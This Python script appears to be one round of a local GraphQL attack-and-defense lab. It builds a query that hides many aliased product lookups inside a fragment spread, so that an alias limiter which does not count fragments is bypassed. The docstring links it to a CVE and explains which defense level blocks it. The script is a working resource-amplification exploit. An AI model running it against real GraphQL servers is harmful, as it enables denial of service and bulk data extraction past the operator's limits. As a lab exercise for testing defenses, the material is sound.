"""Round 3 attack — alias amplification through fragment spreads.

Round 2's alias limiter counts aliases on the operation's own selection set and
does not follow fragment spreads. So hide the aliases inside a fragment and spread
it: the limiter sees one fragment spread (zero aliases) while the server expands
and resolves all of them. This is the shape of CVE-2026-47707, the alias-
amplification bypass in Strawberry's MaxAliasesLimiter, where the limiter failed
to count how many times a fragment is resolved.

At DEFENSE_LEVEL=2 this bypasses the alias cap and runs at full cost. At
DEFENSE_LEVEL=3 the persisted-query allowlist rejects it: the amplified query is
not a trusted document the first-party client ever shipped, so it never runs —
and the fragment-aware counter would catch it even if it somehow were allowed.
"""

from __future__ import annotations

import httpx

from _common import BASE_URL, headers, require_local_target

ACTOR = "bot-r3"


def fragment_amp(n: int) -> str:
    aliases = " ".join(f"a{i}: product(id: {i + 1}) {{ id sku price inventory }}" for i in range(n))
    return "query Amp { ...Big } fragment Big on Query { " + aliases + " }"


def run(base: str = BASE_URL, n: int = 40) -> dict:
    require_local_target(base)
    h = headers(ACTOR)
    with httpx.Client(base_url=base, headers=h, timeout=15) as c:
        r = c.post("/graphql", json={"query": fragment_amp(n), "operationName": "Amp"})
        body = r.json()
        blocked = r.status_code != 200 or ("data" not in body or body.get("data") is None)
        got = len(body["data"]) if body.get("data") else 0
        cost = body.get("extensions", {}).get("cost", 0)
        reason = body.get("errors", [{}])[0].get("message", "") if "errors" in body else ""
    return {"actor": ACTOR, "aliases_sent": n, "blocked": blocked,
            "products_via_fragment": got, "resolver_cost": cost, "reason": reason}


if __name__ == "__main__":
    s = run()
    if s["blocked"]:
        print(f"[round3] BLOCKED: {s['reason']}")
    else:
        print(f"[round3] bypass: {s['aliases_sent']} aliases hidden in a fragment "
              f"pulled {s['products_via_fragment']} products at resolver cost {s['resolver_cost']}")
